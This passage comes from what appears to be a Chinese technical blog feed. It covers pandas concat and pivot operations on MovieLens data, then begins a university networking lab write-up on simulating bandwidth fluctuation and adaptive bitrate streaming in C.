<span class="number">978300275</span></span><br><span class="line"><span class="number">4</span>       <span class="number">1</span>     <span class="number">2355</span>       <span class="number">5</span>  <span class="number">978824291</span></span><br><span class="line">    UserID Gender  Age  Occupation Zip-code</span><br><span class="line"><span class="number">0</span>       <span class="number">1</span>      F    <span class="number">1</span>          <span class="number">10</span>    <span class="number">48067</span></span><br><span class="line"><span class="number">1</span>       <span class="number">2</span>      M   <span class="number">56</span>          <span class="number">16</span>    <span class="number">70072</span></span><br><span class="line"><span class="number">2</span>       <span class="number">3</span>      M   <span class="number">25</span>          <span class="number">15</span>    <span class="number">55117</span></span><br><span class="line"><span class="number">3</span>       <span class="number">4</span>      M   <span class="number">45</span>           <span class="number">7</span>    <span class="number">02460</span></span><br><span class="line"><span class="number">4</span>       <span class="number">5</span>      M   <span class="number">25</span>          <span class="number">20</span>    <span class="number">55455</span></span><br><span class="line">   UserID  MovieID  Rating  Timestamp Gender  Age  Occupation Zip-code</span><br><span class="line"><span class="number">0</span>       <span class="number">1</span>     <span class="number">1193</span>       <span class="number">5</span>  <span class="number">978300760</span>      F    <span class="number">1</span>          <span class="number">10</span>    <span class="number">48067</span></span><br><span class="line"><span class="number">1</span>       <span class="number">1</span>      <span class="number">661</span>       <span class="number">3</span>  <span class="number">978302109</span>      F    <span class="number">1</span>          <span class="number">10</span>    <span class="number">48067</span></span><br><span class="line"><span class="number">2</span>       <span class="number">1</span>      <span class="number">914</span>       <span class="number">3</span>  <span class="number">978301968</span>      F    <span class="number">1</span>          <span class="number">10</span>    <span class="number">48067</span></span><br><span class="line"><span class="number">3</span>       <span class="number">1</span>     <span class="number">3408</span>       <span class="number">4</span>  <span class="number">978300275</span>      F    <span class="number">1</span>          <span class="number">10</span>    <span class="number">48067</span></span><br><span class="line"><span class="number">4</span>       <span class="number">1</span>     <span class="number">2355</span>       <span class="number">5</span>  <span class="number">978824291</span>      F    <span class="number">1</span>          <span class="number">10</span>    <span class="number">48067</span></span><br></pre></td></tr></table></figure><h2 id="2-concat合并"><a href="#2-concat合并" class="headerlink" title="2. concat合并"></a>2. concat合并</h2><h3 id="2-1-函数定义"><a href="#2-1-函数定义" class="headerlink" title="2.1 函数定义"></a>2.1 函数定义</h3><p><strong>pandas.concat(objs, axis=0, join=‘outer’, ignore_index=False)</strong></p><ul><li>objs：一个列表，内容可以是DataFrame或者Series，可以混合</li><li>axis：默认是0代表按行合并，如果等于1代表按列合并</li><li>join：合并的时候索引的对齐方式，默认是outer join，也可以是inner join</li><li>ignore_index：是否忽略掉原来的数据索引</li></ul><p><strong>DataFrame.append(other, ignore_index=False)</strong></p><p>append只有按行合并，没有按列合并，相当于concat按行的简写形式</p><ul><li>other：单个dataframe、series、dict，或者列表</li><li>ignore_index：是否忽略掉原来的数据索引<br>-<h3 id="2-2-合并示例"><a href="#2-2-合并示例" class="headerlink" title="2.2 合并示例"></a>2.2 合并示例</h3></li></ul><p>原始数据：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">df1 = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>: [<span class="string">&#x27;A0&#x27;</span>, <span class="string">&#x27;A1&#x27;</span>, <span class="string">&#x27;A2&#x27;</span>, <span class="string">&#x27;A3&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;B&#x27;</span>: [<span class="string">&#x27;B0&#x27;</span>, <span class="string">&#x27;B1&#x27;</span>, <span class="string">&#x27;B2&#x27;</span>, <span class="string">&#x27;B3&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;C&#x27;</span>: [<span class="string">&#x27;C0&#x27;</span>, <span class="string">&#x27;C1&#x27;</span>, <span class="string">&#x27;C2&#x27;</span>, <span class="string">&#x27;C3&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;D&#x27;</span>: [<span class="string">&#x27;D0&#x27;</span>, <span class="string">&#x27;D1&#x27;</span>, <span class="string">&#x27;D2&#x27;</span>, <span class="string">&#x27;D3&#x27;</span>],</span><br><span class="line">                    <span class="string">&#x27;E&#x27;</span>: [<span class="string">&#x27;E0&#x27;</span>, <span class="string">&#x27;E1&#x27;</span>, <span class="string">&#x27;E2&#x27;</span>, <span class="string">&#x27;E3&#x27;</span>]</span><br><span class="line">                   &#125;)</span><br><span class="line">df2 = pd.DataFrame(&#123; <span class="string">&#x27;A&#x27;</span>: [<span class="string">&#x27;A4&#x27;</span>, <span class="string">&#x27;A5&#x27;</span>, <span class="string">&#x27;A6&#x27;</span>, <span class="string">&#x27;A7&#x27;</span>],</span><br><span class="line">                     <span class="string">&#x27;B&#x27;</span>: [<span class="string">&#x27;B4&#x27;</span>, <span class="string">&#x27;B5&#x27;</span>, <span class="string">&#x27;B6&#x27;</span>, <span class="string">&#x27;B7&#x27;</span>],</span><br><span class="line">                     <span class="string">&#x27;C&#x27;</span>: [<span class="string">&#x27;C4&#x27;</span>, <span class="string">&#x27;C5&#x27;</span>, <span class="string">&#x27;C6&#x27;</span>, <span class="string">&#x27;C7&#x27;</span>],</span><br><span class="line">                     <span class="string">&#x27;D&#x27;</span>: [<span class="string">&#x27;D4&#x27;</span>, <span class="string">&#x27;D5&#x27;</span>, <span class="string">&#x27;D6&#x27;</span>, <span class="string">&#x27;D7&#x27;</span>],</span><br><span class="line">                     <span class="string">&#x27;F&#x27;</span>: [<span class="string">&#x27;F4&#x27;</span>, <span class="string">&#x27;F5&#x27;</span>, <span class="string">&#x27;F6&#x27;</span>, <span class="string">&#x27;F7&#x27;</span>]</span><br><span class="line">                   &#125;)</span><br><span class="line">                                      </span><br><span class="line"><span class="built_in">print</span>(df1, <span class="string">&#x27;\n&#x27;</span>, df2)</span><br></pre></td></tr></table></figure></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    A   B   C   D   E</span><br><span class="line"><span class="number">0</span>  A0  B0  C0  D0  E0</span><br><span class="line"><span class="number">1</span>  A1  B1  C1  D1  E1</span><br><span class="line"><span class="number">2</span>  A2  B2  C2  D2  E2</span><br><span class="line"><span class="number">3</span>  A3  B3  C3  D3  E3</span><br><span class="line">     A   B   C   D   F</span><br><span class="line"><span class="number">0</span>  A4  B4  C4  D4  F4</span><br><span class="line"><span class="number">1</span>  A5  B5  C5  D5  F5</span><br><span class="line"><span class="number">2</span>  A6  B6  C6  D6  F6</span><br><span class="line"><span class="number">3</span>  A7  B7  C7  D7  F7</span><br></pre></td></tr></table></figure><p>有无ignore_index的区别：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">df3 = pd.concat([df1, df2])</span><br><span class="line"></span><br><span class="line">df4 = pd.concat([df1, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df3, <span class="string">&#x27;\n&#x27;</span>, df4)</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    A   B   C   D    E    F</span><br><span class="line"><span class="number">0</span>  A0  B0  C0  D0   E0  NaN</span><br><span class="line"><span class="number">1</span>  A1  B1  C1  D1   E1  NaN</span><br><span class="line"><span class="number">2</span>  A2  B2  C2  D2   E2  NaN</span><br><span class="line"><span class="number">3</span>  A3  B3  C3  D3   E3  NaN</span><br><span class="line"><span class="number">0</span>  A4  B4  C4  D4  NaN   F4</span><br><span class="line"><span class="number">1</span>  A5  B5  C5  D5  NaN   F5</span><br><span class="line"><span class="number">2</span>  A6  B6  C6  D6  NaN   F6</span><br><span class="line"><span class="number">3</span>  A7  B7  C7  D7  NaN   F7</span><br><span class="line">     A   B   C   D    E    F</span><br><span class="line"><span class="number">0</span>  A0  B0  C0  D0   E0  NaN</span><br><span class="line"><span class="number">1</span>  A1  B1  C1  D1   E1  NaN</span><br><span class="line"><span class="number">2</span>  A2  B2  C2  D2   E2  NaN</span><br><span class="line"><span class="number">3</span>  A3  B3  C3  D3   E3  NaN</span><br><span class="line"><span class="number">4</span>  A4  B4  C4  D4  NaN   F4</span><br><span class="line"><span class="number">5</span>  A5  B5  C5  D5  NaN   F5</span><br><span class="line"><span class="number">6</span>  A6  B6  C6  D6  NaN   F6</span><br><span class="line"><span class="number">7</span>  A7  B7  C7  D7  NaN   F7</span><br></pre></td></tr></table></figure><p>默认为outer，使用inner如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df5 = pd.concat([df1, df2], join=<span class="string">&#x27;inner&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df5)</span><br></pre></td></tr></table></figure></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    A   B   C   D</span><br><span class="line"><span class="number">0</span>  A0  B0  C0  D0</span><br><span class="line"><span class="number">1</span>  A1  B1  C1  D1</span><br><span class="line"><span class="number">2</span>  A2  B2  C2  D2</span><br><span class="line"><span class="number">3</span>  A3  B3  C3  D3</span><br><span class="line"><span class="number">0</span>  A4  B4  C4  D4</span><br><span class="line"><span class="number">1</span>  A5  B5  C5  D5</span><br><span class="line"><span class="number">2</span>  A6  B6  C6  D6</span><br><span class="line"><span class="number">3</span>  A7  B7  C7  D7</span><br></pre></td></tr></table></figure><h1 id="十一、数据透视"><a href="#十一、数据透视" class="headerlink" title="十一、数据透视"></a>十一、数据透视</h1><h2 id="1-透视方法"><a href="#1-透视方法" class="headerlink" title="1. 透视方法"></a>1. 透视方法</h2><p><strong>1) stack 和 unstack</strong></p><p>stack和unstack互为逆操作</p><p>stack将<strong>列索引</strong>转成<strong>最内层行索引</strong></p><p>而unstack将<strong>最内层行索引</strong>转成<strong>列索引</strong></p><p>具体参考：<a href="https://blog.csdn.net/S_o_l_o_n/article/details/80917211">pandas中DataFrame的stack()、unstack()和pivot()方法的对比_pandas pivot和stack区别-CSDN博客</a></p><p><strong>2) reset_index 和 pivot</strong></p><p>DataFrame.pivot(index, columns, values)</p><p>指定三列，依次为行索引、列索引、构建一个DataFrame</p><p>使用rest_index可实现逆操作</p><h2 id="2-透视示例"><a href="#2-透视示例" class="headerlink" title="2. 透视示例"></a>2. 透视示例</h2><h3 id="2-1-数据预处理"><a href="#2-1-数据预处理" class="headerlink" title="2.1 数据预处理"></a>2.1 数据预处理</h3><p>原始数据：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">df = pd.read_csv(</span><br><span class="line">    <span class="string">&quot;../datas/movielens-1m/ratings.dat&quot;</span>,</span><br><span class="line">    header=<span class="literal">None</span>,</span><br><span class="line">    names=<span class="string">&quot;UserID::MovieID::Rating::Timestamp&quot;</span>.split(<span class="string">&quot;::&quot;</span>),</span><br><span class="line">    sep=<span class="string">&quot;::&quot;</span>,</span><br><span class="line">    engine=<span class="string">&quot;python&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df.head())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   UserID  MovieID  Rating  Timestamp</span><br><span class="line"><span class="number">0</span>       <span class="number">1</span>     <span class="number">1193</span>       <span class="number">5</span>  <span class="number">978300760</span></span><br><span class="line"><span class="number">1</span>       <span class="number">1</span>      <span class="number">661</span>       <span class="number">3</span>  <span class="number">978302109</span></span><br><span class="line"><span class="number">2</span>       <span class="number">1</span>      <span class="number">914</span>       <span class="number">3</span>  <span class="number">978301968</span></span><br><span class="line"><span class="number">3</span>       <span class="number">1</span>     <span class="number">3408</span>       <span class="number">4</span>  <span class="number">978300275</span></span><br><span class="line"><span class="number">4</span>       <span class="number">1</span>     <span class="number">2355</span>       <span class="number">5</span>  <span class="number">978824291</span></span><br></pre></td></tr></table></figure><p>调用pd.to_datetime将时间戳转化为时间对象，通过访问对象的属性dt.month访问月份，并做统计操作<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 统计每个月份每个评级的用户数量</span></span><br><span class="line"></span><br><span class="line">df[<span class="string">&quot;pdate&quot;</span>] = pd.to_datetime(df[<span class="string">&quot;Timestamp&quot;</span>], unit=<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">df_group = df.groupby([df[<span class="string">&#x27;pdate&#x27;</span>].dt.month, <span class="string">&#x27;Rating&#x27;</span>])[<span class="string">&#x27;UserID&#x27;</span>].count()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df_group.head())</span><br></pre></td></tr></table></figure></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pdate  Rating</span><br><span class="line"><span class="number">1</span>      <span class="number">1</span>         <span class="number">1127</span></span><br><span class="line">       <span class="number">2</span>         <span class="number">2608</span></span><br><span class="line">       <span class="number">3</span>         <span class="number">6442</span></span><br><span class="line">       <span class="number">4</span>         <span class="number">8400</span></span><br><span class="line">       <span class="number">5</span>         <span class="number">4495</span></span><br><span class="line"><span class="function">Name: <span class="title">UserID</span>, <span class="title">dtype</span>: <span class="title">int64</span></span></span><br></pre></td></tr></table></figure><h3 id="2-2-使用透视"><a href="#2-2-使用透视" class="headerlink" title="2.2 使用透视"></a>2.2 使用透视</h3><p><strong>1) unstack 和 stack示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df_unstack = df_group.unstack()</span><br><span class="line"></span><br><span class="line">print(df_unstack.head())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Rating     <span class="number">1</span>     <span class="number">2</span>      <span class="number">3</span>      <span class="number">4</span>      <span class="number">5</span></span><br><span class="line">pdate</span><br><span class="line"><span class="number">1</span>       <span class="number">1127</span>  <span class="number">2608</span>   <span class="number">6442</span>   <span class="number">8400</span>   <span class="number">4495</span></span><br><span class="line"><span class="number">2</span>        <span class="number">629</span>  <span class="number">1464</span>   <span class="number">3297</span>   <span class="number">4403</span>   <span class="number">2335</span></span><br><span class="line"><span class="number">3</span>        <span class="number">466</span>  <span class="number">1077</span>   <span class="number">2523</span>   <span class="number">3032</span>   <span class="number">1439</span></span><br><span class="line"><span class="number">4</span>       <span class="number">1048</span>  <span class="number">2247</span>   <span class="number">5501</span>   <span class="number">6748</span>   <span class="number">3863</span></span><br><span class="line"><span class="number">5</span>       <span class="number">4557</span>  <span class="number">7631</span>  <span class="number">18481</span>  <span class="number">25769</span>  <span class="number">17840</span></span><br></pre></td></tr></table></figure><p>绘制曲线<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df_unstack.plot()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></p><p><img src="/img/2024/04/pandas/pivotPlot.png" alt="image.png"></p><p><strong>2) reset_index 和 pivot示例</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df_reset = df_group.reset_index()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df_reset.head())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   pdate  Rating    pv</span><br><span class="line"><span class="number">0</span>      <span class="number">1</span>       <span class="number">1</span>  <span class="number">1127</span></span><br><span class="line"><span class="number">1</span>      <span class="number">1</span>       <span class="number">2</span>  <span class="number">2608</span></span><br><span class="line"><span class="number">2</span>      <span class="number">1</span>       <span class="number">3</span>  <span class="number">6442</span></span><br><span class="line"><span class="number">3</span>      <span class="number">1</span>       <span class="number">4</span>  <span class="number">8400</span></span><br><span class="line"><span class="number">4</span>      <span class="number">1</span>       <span class="number">5</span>  <span class="number">4495</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df_pivot = df_reset.pivot(<span class="string">&#x27;pdate&#x27;</span>, <span class="string">&#x27;Rating&#x27;</span>, <span class="string">&#x27;pv&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df_pivot.head())</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Rating     <span class="number">1</span>     <span class="number">2</span>      <span class="number">3</span>      <span class="number">4</span>      <span class="number">5</span></span><br><span class="line">pdate</span><br><span class="line"><span class="number">1</span>       <span class="number">1127</span>  <span class="number">2608</span>   <span class="number">6442</span>   <span class="number">8400</span>   <span class="number">4495</span></span><br><span class="line"><span class="number">2</span>        <span class="number">629</span>  <span class="number">1464</span>   <span class="number">3297</span>   <span class="number">4403</span>   <span class="number">2335</span></span><br><span class="line"><span class="number">3</span>        <span class="number">466</span>  <span class="number">1077</span>   <span class="number">2523</span>   <span class="number">3032</span>   <span class="number">1439</span></span><br><span class="line"><span class="number">4</span>       <span class="number">1048</span>  <span class="number">2247</span>   <span class="number">5501</span>   <span class="number">6748</span>   <span class="number">3863</span></span><br><span class="line"><span class="number">5</span>       <span class="number">4557</span>  <span class="number">7631</span>  <span class="number">18481</span>  <span class="number">25769</span>  <span class="number">17840</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【SZU计算机网络实验】实现码率自适应传输</title>
      <link href="/2024/04/09/%E3%80%90SZU%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E3%80%91%E5%AE%9E%E7%8E%B0%E7%A0%81%E7%8E%87%E8%87%AA%E9%80%82%E5%BA%94%E4%BC%A0%E8%BE%93/"/>
      <url>/2024/04/09/%E3%80%90SZU%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E3%80%91%E5%AE%9E%E7%8E%B0%E7%A0%81%E7%8E%87%E8%87%AA%E9%80%82%E5%BA%94%E4%BC%A0%E8%BE%93/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>哈哈实验截止时间推迟了一周，不变的还是被ddl追着跑</p><p>本次实验主要在上次实验（流式视频传输）的基础上，模拟网络波动的情况，设计从客户端根据网络波动情况请求不同码率的视频片段的算法，从而提升用户体验（quality of experience, or QoE）</p><p>相关资料：</p><p>实验文档：<a href="http://course.snrc.site/computer-networks/">计算机网络课程综合实验平台 (snrc.site)</a></p><h1 id="一、引入网络波动"><a href="#一、引入网络波动" class="headerlink" title="一、引入网络波动"></a>一、引入网络波动</h1><p>实验提供的文件库<strong>fluctuation.h</strong>中包含了许多与引入网络波动相关的函数，将其在<strong>server.c</strong>中引入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fluctuation.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>在代码初始化阶段调用 <strong>load_fl()</strong> 函数初始化网络波动相关信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***初始化阶段***/</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> server_fd, new_socket;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server_address</span>;</span></span><br><span class="line"><span class="type">int</span> opt = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(server_address);</span><br><span class="line"><span class="type">char</span> buffer[BUFFER_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化网络波动相关信息</span></span><br><span class="line">load_fl();</span><br></pre></td></tr></table></figure><p>将server.c中所有的send更改为send_fl()，键盘点击ctrl+F</p><p><img src="/img/2024/04/exp2/img.png" alt="image.png"></p><p>在结束阶段调用 <strong>release_fl()</strong> 函数释放为网络波动模拟模块所分配系统资源。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***结束阶段***/</span></span><br><span class="line"><span class="comment">// 释放为网络波动模拟模块所分配系统资源</span></span><br><span class="line">release_fl();</span><br><span class="line"></span><br><span class="line">closesocket(server_fd);</span><br><span class="line">closesocket(new_socket);</span><br><span class="line">WSACleanup();</span><br></pre></td></tr></table></figure><p>到此网络波动模块就引入成功了</p><p>其实程序在运行时便会读取配置文件variation.cfg，实验文件中还提供了不同的网络波动，在文件BandwidthTrace.txt中，可选择其一将其复制到配置文件中。</p><p>BandwidthTrace.txt:<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Trace1:</span><br><span class="line">100,100,2000</span><br><span class="line">200,200,2000</span><br><span class="line">400,400,2000</span><br><span class="line">800,800,2000</span><br><span class="line">1600,1600,2000</span><br><span class="line">3200,3200,2000</span><br><span class="line">1600,1600,2000</span><br><span class="line">800,800,2000</span><br><span class="line">400,400,2000</span><br><span class="line">200,200,2000</span><br><span class="line">100,100,2000</span><br><span class="line"></span><br><span class="line">Trace2:</span><br><span class="line">10,1,1000</span><br><span class="line">250,250,1000</span><br><span class="line">500,500,1000</span><br><span class="line">750,750,1000</span><br><span class="line">1000,1000,1000</span><br><span class="line">1250,1250,1000</span><br><span class="line">1500,1500,1000</span><br><span class="line">1750,1750,1000</span><br><span class="line">2000,2000,1000</span><br><span class="line">2500,2500,1000</span><br><span class="line">3000,3000,1000</span><br><span class="line">2500,2500,1000</span><br><span class="line">2000,2000,1000</span><br><span class="line">1750,1750,1000</span><br><span class="line">1500,1500,1000</span><br><span class="line">1250,1250,1000</span><br><span class="line">1000,1000,1000</span><br><span class="line">750,750,1000</span><br><span class="line">500,500,1000</span><br><span class="line">250,250,1000</span><br><span class="line"></span><br><span class="line">Trace3:</span><br><span class="line">10,1,15000</span><br><span class="line">3500,3500,5000</span><br><span class="line">700,700,10000</span><br><span class="line">2000,2000,5000</span><br></pre></td></tr></table></figure></p><p>variation.cfg:<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10,1,15000</span><br><span class="line">3500,3500,5000</span><br><span class="line">700,700,10000</span><br><span class="line">2000,2000,5000</span><br></pre></td></tr></table></figure></p><p>可以看到默认的配置是BandwidthTrace.txt中的Trace3</p><p>将服务端和客户端都跑起来，发现网页播放的视频出现卡顿，说明网络波动引入成功</p><p><img src="/img/2024/04/exp2/img_1.png" alt="image.png"></p><h1 id="二、理解ABR算法"><a href="#二、理解ABR算法" class="headerlink" title="二、理解ABR算法"></a>二、理解ABR算法</h1><p>在客户端<strong>client.c</strong>中引入实现ABR算法所需要的文件库<strong>abrlib.h</strong></p><p>库中函数允许我们创建一个队列，将需要请求的视频片段的文件名做入队和出队操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/************1. 添加abr相关参数的头文件******************************/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;abrlib.h&quot;</span></span></span><br><span class="line"><span class="comment">/*******************************************************************/</span></span><br></pre></td></tr></table></figure><p>在初始化阶段添加下载队列相关初始代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/***初始化阶段***/</span></span><br><span class="line">   WSADATA wsaData;</span><br><span class="line">   WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">   <span class="comment">/************2. 在初始化阶段添加下载队列相关初始代码*******************/</span></span><br><span class="line">Queue download_queue;</span><br><span class="line">QueueInit(&amp;download_queue);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在下载队列中，初始化下载chunk0和chunk1</span></span><br><span class="line">QueuePush(&amp;download_queue,<span class="string">&quot;ocean-1080p-8000k-0.ts&quot;</span>);</span><br><span class="line">QueuePush(&amp;download_queue,<span class="string">&quot;ocean-1080p-8000k-1.ts&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> video_id=<span class="number">0</span>; <span class="comment">//当前下载视频的chunk id</span></span><br><span class="line"><span class="type">int</span> current_bitrate=<span class="number">0</span>;  <span class="comment">//当前下载的码率 (kbps)</span></span><br><span class="line"><span class="type">int</span> last_bitrate=<span class="number">0</span>;  <span class="comment">//上一轮下载视频的码率 (kbps)</span></span><br><span class="line"><span class="comment">/*******************************************************************/</span></span><br></pre></td></tr></table></figure></p><p>我们初始请求两个码率最高的视频片段，之后根据第一个的视频片段的下载时间决定请求第三个视频的码率，根据第二个视频片段的下载时间决定请求第四个视频的码率，以此类推，即：</p><p>1 -&gt; 3 -&gt; 5 -&gt; …</p><p>2 -&gt; 4 -&gt; 6 -&gt; …</p><p>默认的ABR算法如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 